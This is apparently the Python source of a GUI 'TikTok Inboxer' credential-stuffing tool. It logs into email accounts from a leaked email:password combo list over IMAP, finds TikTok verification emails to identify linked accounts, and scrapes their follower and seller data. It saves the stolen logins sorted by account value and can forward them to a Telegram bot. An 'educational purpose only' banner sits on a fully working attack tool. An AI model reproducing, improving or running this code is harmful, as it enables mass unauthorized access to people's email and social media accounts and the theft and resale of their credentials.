import tkinter as tk
from tkinter import filedialog, scrolledtext
import threading
import imaplib
import email
import re
import requests
import datetime
import sys
import pyfiglet
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

class TikTokInboxerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("TikTok Inboxer - Educational Purpose Only")
        self.root.geometry("800x600")
        self.root.configure(bg="#1e1e1e")
        
        # Variables
        self.hits = 0
        self.bad = 0
        self.bans = 0
        self.total_likes = 0
        self.send_to_telegram = False
        self.bot_token = ""
        self.chat_id = ""
        self.combo_file = ""
        self.running = False
        
        # Warning banner
        warning_frame = tk.Frame(root, bg="#ff3333", padx=10, pady=10)
        warning_frame.pack(fill=tk.X)
        
        warning_label = tk.Label(
            warning_frame, 
            text="⚠️ EDUCATIONAL PURPOSE ONLY ⚠️\nThis tool should only be used on accounts you own.\nUnauthorized access to accounts is illegal.",
            font=("Arial", 12, "bold"),
            bg="#ff3333",
            fg="white",
            wraplength=780
        )
        warning_label.pack()
        
        # Creator info
        creator_frame = tk.Frame(root, bg="#1e1e1e", padx=10, pady=5)
        creator_frame.pack(fill=tk.X)
        
        creator_label = tk.Label(
            creator_frame,
            text="Created by @xvzndev | Join: https://t.me/+KENj_Vq4iy4xOTQ0",
            font=("Arial", 10),
            bg="#1e1e1e",
            fg="#33ff33"
        )
        creator_label.pack()
        
        # Main frame
        main_frame = tk.Frame(root, bg="#1e1e1e", padx=20, pady=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # File selection
        file_frame = tk.Frame(main_frame, bg="#1e1e1e")
        file_frame.pack(fill=tk.X, pady=10)
        
        file_label = tk.Label(file_frame, text="Combo File:", bg="#1e1e1e", fg="white")
        file_label.pack(side=tk.LEFT, padx=5)
        
        self.file_entry = tk.Entry(file_frame, width=50)
        self.file_entry.pack(side=tk.LEFT, padx=5)
        
        file_button = tk.Button(file_frame, text="Browse", command=self.browse_file, bg="#333333", fg="white")
        file_button.pack(side=tk.LEFT, padx=5)
        
        # Telegram options
        telegram_frame = tk.Frame(main_frame, bg="#1e1e1e")
        telegram_frame.pack(fill=tk.X, pady=10)
        
        self.telegram_var = tk.BooleanVar()
        telegram_check = tk.Checkbutton(
            telegram_frame, 
            text="Send to Telegram", 
            variable=self.telegram_var, 
            command=self.toggle_telegram,
            bg="#1e1e1e", 
            fg="white",
            selectcolor="black",
            activebackground="#1e1e1e"
        )
        telegram_check.pack(side=tk.LEFT)
        
        # Telegram details frame (initially hidden)
        self.telegram_details = tk.Frame(main_frame, bg="#1e1e1e")
        
        token_label = tk.Label(self.telegram_details, text="Bot Token:", bg="#1e1e1e", fg="white")
        token_label.grid(row=0, column=0, padx=5, pady=5, sticky="w")
        
        self.token_entry = tk.Entry(self.telegram_details, width=50)
        self.token_entry.grid(row=0, column=1, padx=5, pady=5)
        
        chat_label = tk.Label(self.telegram_details, text="Chat ID:", bg="#1e1e1e", fg="white")
        chat_label.grid(row=1, column=0, padx=5, pady=5, sticky="w")
        
        self.chat_entry = tk.Entry(self.telegram_details, width=50)
        self.chat_entry.grid(row=1, column=1, padx=5, pady=5)
        
        # Stats frame
        stats_frame = tk.Frame(main_frame, bg="#1e1e1e", pady=10)
        stats_frame.pack(fill=tk.X)
        
        self.stats_label = tk.Label(
            stats_frame,
            text="Hits: 0 | Bad: 0 | Banned: 0",
            font=("Arial", 12),
            bg="#1e1e1e",
            fg="#33ff33"
        )
        self.stats_label.pack()
        
        # Buttons
        button_frame = tk.Frame(main_frame, bg="#1e1e1e", pady=10)
        button_frame.pack(fill=tk.X)
        
        self.start_button = tk.Button(
            button_frame,
            text="Start Scanning",
            command=self.start_scanning,
            bg="#33ff33",
            fg="black",
            padx=20,
            pady=10
        )
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        self.stop_button = tk.Button(
            button_frame,
            text="Stop",
            command=self.stop_scanning,
            bg="#ff3333",
            fg="white",
            state=tk.DISABLED,
            padx=20,
            pady=10
        )
        self.stop_button.pack(side=tk.LEFT, padx=10)
        
        # Log area
        log_label = tk.Label(main_frame, text="Logs:", bg="#1e1e1e", fg="white", anchor="w")
        log_label.pack(fill=tk.X, pady=(10, 5))
        
        self.log_area = scrolledtext.ScrolledText(main_frame, height=10, bg="#2d2d2d", fg="#ffffff")
        self.log_area.pack(fill=tk.BOTH, expand=True)
        self.log_area.config(state=tk.DISABLED)
        
    def browse_file(self):
        filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if filename:
            self.combo_file = filename
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, filename)
            self.log(f"Selected combo file: {filename}")
    
    def toggle_telegram(self):
        if self.telegram_var.get():
            self.telegram_details.pack(fill=tk.X, pady=10)
        else:
            self.telegram_details.pack_forget()
    
    def log(self, message):
        self.log_area.config(state=tk.NORMAL)
        self.log_area.insert(tk.END, f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {message}\n")
        self.log_area.see(tk.END)
        self.log_area.config(state=tk.DISABLED)
    
    def update_stats(self):
        if self.running:
            self.stats_label.config(text=f"Hits: {self.hits} | Bad: {self.bad} | Banned: {self.bans}")
            self.root.after(500, self.update_stats)
    
    def get_imap_server(self, email_addr):
        domain = email_addr.split('@')[-1]
        return f"imap.{domain}"
    
    def send_telegram_message(self, message):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        data = {"chat_id": self.chat_id, "text": message, "parse_mode": "Markdown"}
        try:
            requests.post(url, data=data)
        except Exception as e:
            self.log(f"Telegram API error: {str(e)}")
    
    def capture(self, email, password, username):
        try:
            ua = UserAgent()
            headers = {'user-agent': ua.random}
            response = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text
            
            if '"userInfo":{"user":{' not in response:
                return
            
            data = response.split('"userInfo":{"user":{')[1].split('</sc')[0]
            followers = int(re.search(r'"followerCount":(\d+)', data).group(1))
    
            # Determine the file based on follower count
            if followers <= 100:
                file_name = "0-100.txt"
            elif 101 <= followers <= 500:
                file_name = "100-500.txt"
            elif 501 <= followers <= 1000:
                file_name = "500-1K.txt"
            elif 1001 <= followers <= 5000:
                file_name = "1K-5K.txt"
            elif 5001 <= followers <= 10000:
                file_name = "5K-10K.txt"
            else:
                file_name = "10K-1M.txt"
    
            # Extract user details
            user_id = re.search(r'"id":"(.*?)"', data).group(1)
            nickname = re.search(r'"nickname":"(.*?)"', data).group(1)
            following = re.search(r'"followingCount":(\d+)', data).group(1)
            likes = int(re.search(r'"heart":(\d+)', data).group(1))  
            videos = re.search(r'"videoCount":(\d+)', data).group(1) if re.search(r'"videoCount":(\d+)', data) else "N/A"
            friends_count = re.search(r'"friendCount":(\d+)', data).group(1) if re.search(r'"friendCount":(\d+)', data) else "N/A"
            is_private = "Yes" if re.search(r'"privateAccount":(true|false)', data) and re.search(r'"privateAccount":(true|false)', data).group(1) == "true" else "No"
            is_verified = "Yes" if re.search(r'"verified":(true|false)', data) and re.search(r'"verified":(true|false)', data).group(1) == "true" else "No"
            is_seller = "Yes" if re.search(r'"commerceInfo":{"seller":(true|false)', data) and re.search(r'"commerceInfo":{"seller":(true|false)', data).group(1) == "true" else "No"
            language = re.search(r'"language":"(.*?)"', data).group(1) if re.search(r'"language":"(.*?)"', data) else "N/A"
            date_create = datetime.datetime.fromtimestamp(int(re.search(r'"createTime":(\d+)', data).group(1))).strftime("%Y-%m-%d")
            region = re.search(r'"region":"(.*?)"', data).group(1)
    
            self.total_likes += likes  # Update total likes count
    
            result = (f"{email}:{password} | Username = {username} | Followers = {followers} | "
                    f"Following = {following} | Friends = {friends_count} | Likes = {likes} | "
                    f"Videos = {videos} | Private = {is_private} | Verified = {is_verified} | "
                    f"TikTok Seller = {is_seller} | Language = {language} | "
                    f"Country = {region} | Created at = {date_create}\n")
            
            # Save to appropriate file
            with open(file_name, "a", encoding="utf-8", errors="ignore") as f:
                f.write(result)
            
            self.hits += 1
            self.log(f"Hit found: {username} with {followers} followers")
    
            if self.send_to_telegram:
                message = (
                    f"✅ *TikTok Hit Found!*\n\n"
                    f"👤 *Username:* `{username}`\n"
                    f"👥 *Followers:* `{followers}`\n"
                    f"❤️ *Likes:* `{likes}`\n"
                    f"🎥 *Videos:* `{videos}`\n"
                    f"🏷 *Verified:* `{is_verified}`\n"
                    f"🛒 *Seller:* `{is_seller}`\n"
                    f"🌎 *Region:* `{region}`\n"
                    f"📅 *Created:* `{date_create}`\n"
                    f"🔑 *Login:* `{email}:{password}`"
                )
                self.send_telegram_message(message)
        
        except Exception as e:
            self.bans += 1
            self.log(f"Error processing {username}: {str(e)[:50]}...")
    
    def check_email(self, email_addr, password):
        if not self.running:
            return
            
        try:
            imap_server = self.get_imap_server(email_addr)
            mail = imaplib.IMAP4_SSL(imap_server)
            mail.login(email_addr, password)
            mail.select("inbox")
            
            result, data = mail.search(None, 'FROM "register@xvzndev.tiktok.com" SUBJECT "is your verification"')
            
            if result == "OK" and data[0]:
                for num in data[0].split():
                    result, msg_data = mail.fetch(num, "(BODY[HEADER.FIELDS (SUBJECT FROM)])")
                    if result == "OK":
                        for response_part in msg_data:
                            if isinstance(response_part, tuple):
                                raw_email = response_part[1]
                                msg = email.message_from_bytes(raw_email)
                                subject = msg["Subject"]
                                
                                if subject and "is your verification" in subject.lower():
                                    result, body_data = mail.fetch(num, "(BODY[TEXT])")
                                    for part in body_data:
                                        if isinstance(part, tuple):
                                            body = part[1].decode("utf-8", errors="ignore")
                                            if "To change your password" in body:
                                                match = re.search(r"Hi\s+([a-zA-Z0-9_.-]+),", body)
                                                if match:
                                                    username = match.group(1)
                                                    self.capture(email_addr, password, username)
                                                    mail.logout()
                                                    return
            self.bad += 1
        
        except imaplib.IMAP4.error:
            self.bad += 1
        
        except Exception as e:
            self.bad += 1
            self.log(f"Error checking {email_addr}: {str(e)[:50]}...")
    
    def scanner_thread(self):
        try:
            with open(self.combo_file, "r", encoding="utf-8", errors="ignore") as f:
                valid_combos = [line.strip() for line in f if ":" in line]
    
            if not valid_combos:
                self.log("No valid combos found in the file")
                self.stop_scanning()
                return
            
            self.log(f"Starting scan with {len(valid_combos)} combos")
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                for combo in valid_combos:
                    if not self.running:
                        break
                    try:
                        email_addr, password = combo.split(":", 1)
                        executor.submit(self.check_email, email_addr, password)
                    except ValueError:
                        continue
            
            self.log("Scan completed")
            self.stop_scanning()
            
        except Exception as e:
            self.log(f"Error in scanner thread: {str(e)}")
            self.stop_scanning()
    
    def start_scanning(self):
        if not self.file_entry.get():
            self.log("Please select a combo file first")
            return
            
        self.combo_file = self.file_entry.get()
        self.send_to_telegram = self.telegram_var.get()
        
        if self.send_to_telegram:
            self.bot_token = self.token_entry.get()
            self.chat_id = self.chat_entry.get()
            
            if not self.bot_token or not self.chat_id:
                self.log("Please enter both bot token and chat ID")
                return
        
        self.running = True
        self.hits = 0
        self.bad = 0
        self.bans = 0
        self.total_likes = 0
        
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        # Clear log area
        self.log_area.config(state=tk.NORMAL)
        self.log_area.delete(1.0, tk.END)
        self.log_area.config(state=tk.DISABLED)
        
        # Print banner
        banner = pyfiglet.figlet_format('TIKTOK')
        self.log(banner)
        self.log("TikTok Inboxer Full Capture v2 by @xvzndev")
        self.log("Join: https://t.me/+KENj_Vq4iy4xOTQ0")
        self.log("="*50)
        
        # Start scanner thread
        threading.Thread(target=self.scanner_thread, daemon=True).start()
        
        # Start stats update
        self.update_stats()
    
    def stop_scanning(self):
        self.running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log("Scanning stopped")

if __name__ == "__main__":
    root = tk.Tk()
    app = TikTokInboxerApp(root)
    root.mainloop()